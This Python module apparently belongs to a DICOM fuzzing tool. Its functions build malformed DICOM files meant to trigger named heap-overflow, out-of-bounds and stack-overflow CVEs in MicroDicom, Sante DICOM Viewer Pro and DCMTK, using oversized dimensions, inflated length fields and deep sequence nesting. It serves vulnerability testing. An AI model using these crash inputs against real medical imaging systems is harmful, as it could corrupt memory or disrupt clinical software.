"""Memory Corruption CVE Mutations - Deterministic.

Each function returns a list of (variant_name, mutated_bytes) tuples.
All variants are generated deterministically - no random selection.
"""

from __future__ import annotations

import struct


def mutate_cve_2025_5943(data: bytes) -> list[tuple[str, bytes]]:
    """CVE-2025-5943: MicroDicom heap buffer overflow in pixel data parsing.

    Returns all variants:
    - heap_overflow: Sets Rows/Columns to max values with undersized PixelData
    - integer_overflow: Sets dimensions that overflow when multiplied
    """
    variants = []

    # Variant 1: Heap overflow via large dimensions
    result = bytearray(data)
    rows_tag = b"\x28\x00\x10\x00"
    cols_tag = b"\x28\x00\x11\x00"
    bits_tag = b"\x28\x00\x00\x01"

    idx = data.find(rows_tag)
    if idx != -1 and idx + 8 < len(result):
        result[idx + 6 : idx + 8] = struct.pack("<H", 0xFFFF)
    idx = data.find(cols_tag)
    if idx != -1 and idx + 8 < len(result):
        result[idx + 6 : idx + 8] = struct.pack("<H", 0xFFFF)
    idx = data.find(bits_tag)
    if idx != -1 and idx + 8 < len(result):
        result[idx + 6 : idx + 8] = struct.pack("<H", 16)
    variants.append(("heap_overflow", bytes(result)))

    # Variant 2: Integer overflow (32768 * 32768 overflows 32-bit)
    result = bytearray(data)
    idx = data.find(rows_tag)
    if idx != -1 and idx + 8 < len(result):
        result[idx + 6 : idx + 8] = struct.pack("<H", 0x8000)
    idx = data.find(cols_tag)
    if idx != -1 and idx + 8 < len(result):
        result[idx + 6 : idx + 8] = struct.pack("<H", 0x8000)
    variants.append(("integer_overflow", bytes(result)))

    return variants


def mutate_cve_2025_35975(data: bytes) -> list[tuple[str, bytes]]:
    """CVE-2025-35975: MicroDicom out-of-bounds write via pixel data dimension mismatch.

    Returns all variants with different dimension combinations that trigger OOB write.
    """
    variants = []
    rows_tag = b"\x28\x00\x10\x00"
    cols_tag = b"\x28\x00\x11\x00"
    bits_tag = b"\x28\x00\x00\x01"
    pixel_data_tag = b"\xe0\x7f\x10\x00"

    oob_triggers = [
        ("near_max_cols", 1, 0xFFFE, 16),
        ("near_max_rows", 0xFFFE, 1, 16),
        ("large_32bit", 256, 256, 32),
        ("unusual_24bit", 512, 512, 24),
    ]

    for variant_name, rows, cols, bits in oob_triggers:
        result = bytearray(data)

        idx = data.find(rows_tag)
        if idx != -1 and idx + 8 < len(result):
            result[idx + 6 : idx + 8] = struct.pack("<H", rows)

        idx = data.find(cols_tag)
        if idx != -1 and idx + 8 < len(result):
            result[idx + 6 : idx + 8] = struct.pack("<H", cols)

        idx = data.find(bits_tag)
        if idx != -1 and idx + 8 < len(result):
            result[idx + 6 : idx + 8] = struct.pack("<H", bits)

        idx = data.find(pixel_data_tag)
        if idx != -1 and idx + 12 < len(result):
            result[idx + 8 : idx + 12] = struct.pack("<I", 64)

        variants.append((variant_name, bytes(result)))

    return variants


def mutate_cve_2025_36521(data: bytes) -> list[tuple[str, bytes]]:
    """CVE-2025-36521: MicroDicom out-of-bounds read via dimension/buffer mismatch.

    Returns all variants that trigger OOB read during pixel data parsing.
    """
    variants = []
    rows_tag = b"\x28\x00\x10\x00"
    cols_tag = b"\x28\x00\x11\x00"
    bits_tag = b"\x28\x00\x00\x01"
    samples_tag = b"\x28\x00\x02\x00"
    pixel_data_tag = b"\xe0\x7f\x10\x00"

    oob_read_triggers = [
        ("max_rows_min_cols", 0xFFFF, 2, 16, 1),
        ("min_rows_max_cols", 2, 0xFFFF, 16, 1),
        ("large_rgb", 4096, 4096, 8, 3),
        ("very_large_mono", 8192, 8192, 16, 1),
        ("32bit_allocation", 1024, 1024, 32, 1),
    ]

    for variant_name, rows, cols, bits, samples in oob_read_triggers:
        result = bytearray(data)

        for tag, value in [
            (rows_tag, rows),
            (cols_tag, cols),
            (bits_tag, bits),
            (samples_tag, samples),
        ]:
            idx = data.find(tag)
            if idx != -1 and idx + 8 < len(result):
                result[idx + 6 : idx + 8] = struct.pack("<H", value)

        idx = data.find(pixel_data_tag)
        if idx != -1 and idx + 12 < len(result):
            result[idx + 8 : idx + 12] = struct.pack("<I", 32)

        variants.append((variant_name, bytes(result)))

    return variants


def mutate_cve_2025_5307(data: bytes) -> list[tuple[str, bytes]]:
    """CVE-2025-5307: Sante DICOM Viewer Pro out-of-bounds read.

    Returns all variants with malformed pixel data dimensions.
    """
    variants = []
    rows_tag = b"\x28\x00\x10\x00"
    cols_tag = b"\x28\x00\x11\x00"
    samples_tag = b"\x28\x00\x02\x00"
    bits_tag = b"\x28\x00\x00\x01"
    pixel_data_tag = b"\xe0\x7f\x10\x00"

    oob_dimensions = [
        ("large_rgb_16bit", 4096, 4096, 3, 16),
        ("wide_single_row", 8192, 1, 1, 16),
        ("tall_single_col", 1, 8192, 1, 16),
        ("rgba_8bit", 2048, 2048, 4, 8),
    ]

    for variant_name, rows, cols, samples, bits in oob_dimensions:
        result = bytearray(data)

        for tag, value in [
            (rows_tag, rows),
            (cols_tag, cols),
            (samples_tag, samples),
            (bits_tag, bits),
        ]:
            idx = data.find(tag)
            if idx != -1 and idx + 8 < len(result):
                result[idx + 6 : idx + 8] = struct.pack("<H", value)

        idx = data.find(pixel_data_tag)
        if idx != -1 and idx + 12 < len(result):
            result[idx + 8 : idx + 12] = struct.pack("<I", 64)

        variants.append((variant_name, bytes(result)))

    return variants


def mutate_cve_2024_22100(data: bytes) -> list[tuple[str, bytes]]:
    """CVE-2024-22100: MicroDicom heap-based buffer overflow in DCM parsing.

    Returns variant targeting private creator elements.
    """
    result = bytearray(data)
    private_creator_tag = b"\x09\x00\x10\x00"
    idx = data.find(private_creator_tag)

    if idx == -1:
        insert_pos = min(200, len(result) - 4)
        overflow_payload = (
            private_creator_tag
            + b"LO"
            + struct.pack("<H", 0xFFFF)
            + b"A" * 256
        )
        result = result[:insert_pos] + overflow_payload + result[insert_pos:]
    else:
        if idx + 8 < len(result):
            result[idx + 6 : idx + 8] = struct.pack("<H", 0xFFFF)

    sop_uid_tag = b"\x08\x00\x18\x00"
    idx = data.find(sop_uid_tag)
    if idx != -1 and idx + 8 < len(result):
        result[idx + 6 : idx + 8] = struct.pack("<H", 512)

    return [("heap_overflow_private_elements", bytes(result))]


def mutate_cve_2024_25578(data: bytes) -> list[tuple[str, bytes]]:
    """CVE-2024-25578: MicroDicom out-of-bounds write due to lack of validation.

    Returns variant with corrupted VR length fields.
    """
    result = bytearray(data)
    explicit_vrs = [b"OB", b"OW", b"OF", b"OD", b"SQ", b"UN", b"UC", b"UR", b"UT"]

    mutations_applied = 0
    for vr in explicit_vrs:
        idx = 0
        while mutations_applied < 3:
            idx = result.find(vr, idx)
            if idx == -1:
                break

            if idx >= 4 and idx + 8 < len(result):
                length_offset = idx + 4
                if length_offset + 4 < len(result):
                    result[length_offset : length_offset + 4] = struct.pack(
                        "<I", len(result) * 2
                    )
                    mutations_applied += 1

            idx += 1

    return [("oob_write_oversized_length", bytes(result))]


def mutate_cve_2024_28877(data: bytes) -> list[tuple[str, bytes]]:
    """CVE-2024-28877: MicroDicom stack buffer overflow via nested structures.

    Returns variant with deep nesting and oversized patient name.
    """
    result = bytearray(data)
    nesting_depth = 500

    item_start = b"\xfe\xff\x00\xe0"
    item_end = b"\xfe\xff\x0d\xe0"
    sq_start = b"\x08\x00\x15\x11"

    nested = b""
    for _ in range(nesting_depth):
        nested = (
            sq_start
            + b"SQ\x00\x00"
            + b"\xff\xff\xff\xff"
            + item_start
            + b"\xff\xff\xff\xff"
            + nested
            + item_end
            + b"\x00\x00\x00\x00"
            + b"\xfe\xff\xdd\xe0"
            + b"\x00\x00\x00\x00"
        )

    patient_name_tag = b"\x10\x00\x10\x00"
    idx = data.find(patient_name_tag)
    if idx != -1 and idx + 8 < len(result):
        result[idx + 6 : idx + 8] = struct.pack("<H", 4096)
        overflow_data = b"A" * 4096
        result = result[: idx + 8] + overflow_data + result[idx + 8 :]

    result = result[:-4] + nested + result[-4:]

    return [("stack_overflow_deep_nesting", bytes(result))]


def mutate_cve_2024_1453(data: bytes) -> list[tuple[str, bytes]]:
    """CVE-2024-1453: Sante DICOM Viewer Pro out-of-bounds read (2024).

    Returns all variants targeting different DICOM elements.
    """
    variants = []

    oob_targets = [
        (b"\x08\x00\x60\x00", b"SH", 256, "modality"),
        (b"\x08\x00\x70\x00", b"LO", 512, "manufacturer"),
        (b"\x10\x00\x10\x00", b"PN", 1024, "patient_name"),
        (b"\x10\x00\x20\x00", b"LO", 512, "patient_id"),
        (b"\x20\x00\x0d\x00", b"UI", 256, "study_uid"),
    ]

    for tag, vr, length, name in oob_targets:
        result = bytearray(data)
        idx = data.find(tag)

        if idx != -1 and idx + 8 < len(result):
            remaining = len(result) - idx - 8
            oversized_length = remaining + 500
            result[idx + 6 : idx + 8] = struct.pack("<H", min(oversized_length, 0xFFFF))
        else:
            insert_pos = min(200, len(result) - 4)
            oversized_element = tag + vr + struct.pack("<H", length) + b"X" * 16
            result = result[:insert_pos] + oversized_element + result[insert_pos:]

        variants.append((f"oob_read_{name}", bytes(result)))

    return variants


def mutate_cve_2024_47796(data: bytes) -> list[tuple[str, bytes]]:
    """CVE-2024-47796: DCMTK out-of-bounds write in nowindow LUT processing.

    Returns all variants with different LUT overflow patterns.
    """
    variants = []
    rows_tag = b"\x28\x00\x10\x00"
    cols_tag = b"\x28\x00\x11\x00"
    frames_tag = b"\x28\x00\x08\x00"
    high_bit_tag = b"\x28\x00\x02\x01"
    bits_stored_tag = b"\x28\x00\x01\x01"
    pixel_data_tag = b"\xe0\x7f\x10\x00"

    lut_overflow_patterns = [
        ("max_rows", 0xFFFF, 1, 1, 15, 16),
        ("max_cols", 1, 0xFFFF, 1, 15, 16),
        ("many_frames", 256, 256, 0xFF, 15, 16),
        ("32bit_large", 512, 512, 1, 31, 32),
        ("12bit_unusual", 1024, 1024, 1, 11, 12),
    ]

    for variant_name, rows, cols, frames, high_bit, bits_stored in lut_overflow_patterns:
        result = bytearray(data)

        for tag, value in [
            (rows_tag, rows),
            (cols_tag, cols),
            (high_bit_tag, high_bit),
            (bits_stored_tag, bits_stored),
        ]:
            idx = data.find(tag)
            if idx != -1 and idx + 8 < len(result):
                result[idx + 6 : idx + 8] = struct.pack("<H", value)

        frames_idx = data.find(frames_tag)
        if frames_idx != -1 and frames_idx + 8 < len(result):
            frames_str = str(frames).encode()
            if len(frames_str) % 2:
                frames_str += b" "
            result[frames_idx + 6 : frames_idx + 8] = struct.pack("<H", len(frames_str))
        else:
            insert_pos = min(300, len(result) - 4)
            frames_str = str(frames).encode()
            if len(frames_str) % 2:
                frames_str += b" "
            frames_element = frames_tag + b"IS" + struct.pack("<H", len(frames_str)) + frames_str
            result = result[:insert_pos] + frames_element + result[insert_pos:]

        idx = data.find(pixel_data_tag)
        if idx != -1 and idx + 12 < len(result):
            result[idx + 8 : idx + 12] = struct.pack("<I", 128)

        variants.append((f"lut_overflow_{variant_name}", bytes(result)))

    return variants


def mutate_cve_2024_52333(data: bytes) -> list[tuple[str, bytes]]:
    """CVE-2024-52333: DCMTK out-of-bounds write in determineMinMax.

    Returns all variants with different minmax overflow patterns.
    """
    variants = []
    rows_tag = b"\x28\x00\x10\x00"
    cols_tag = b"\x28\x00\x11\x00"
    samples_tag = b"\x28\x00\x02\x00"
    bits_alloc_tag = b"\x28\x00\x00\x01"
    planar_tag = b"\x28\x00\x06\x00"
    pixel_data_tag = b"\xe0\x7f\x10\x00"

    minmax_overflow_patterns = [
        ("near_max_rows", 0xFFFE, 2, 1, 16, 0),
        ("near_max_cols", 2, 0xFFFE, 1, 16, 0),
        ("rgb_planar_large", 1000, 1000, 3, 8, 1),
        ("large_mono_8bit", 2048, 2048, 1, 8, 0),
        ("rgba_16bit", 256, 256, 4, 16, 0),
    ]

    for variant_name, rows, cols, samples, bits, planar in minmax_overflow_patterns:
        result = bytearray(data)

        for tag, value in [
            (rows_tag, rows),
            (cols_tag, cols),
            (samples_tag, samples),
            (bits_alloc_tag, bits),
            (planar_tag, planar),
        ]:
            idx = data.find(tag)
            if idx != -1 and idx + 8 < len(result):
                result[idx + 6 : idx + 8] = struct.pack("<H", value)

        idx = data.find(pixel_data_tag)
        if idx != -1 and idx + 12 < len(result):
            result[idx + 8 : idx + 12] = struct.pack("<I", 64)
        else:
            pixel_element = (
                pixel_data_tag
                + b"OW"
                + b"\x00\x00"
                + struct.pack("<I", 64)
                + b"\x00" * 64
            )
            result = result[:-4] + pixel_element + result[-4:]

        variants.append((f"minmax_overflow_{variant_name}", bytes(result)))

    return variants
